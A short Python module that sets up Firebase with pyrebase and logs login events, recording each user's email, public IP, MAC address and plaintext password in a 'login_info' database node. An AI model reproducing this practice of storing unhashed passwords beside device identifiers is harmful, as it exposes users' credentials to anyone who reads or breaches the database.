import pyrebase
from firebase_config import firebase_config
from getmac import get_mac_address
from datetime import datetime
import requests

firebase = pyrebase.initialize_app(firebase_config)
auth = firebase.auth()
db = firebase.database()

def get_client_ip():
    return requests.get('https://api.ipify.org').text

def get_mac():
    return get_mac_address()


def store_login_info(email, ip, mac, password=None, timestamp=None):
    if not timestamp:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    data = {
        "email": email,
        "ip": ip,
        "mac": mac,
        "password": password,
        "timestamp": timestamp
    }
    db.child("login_info").push(data)
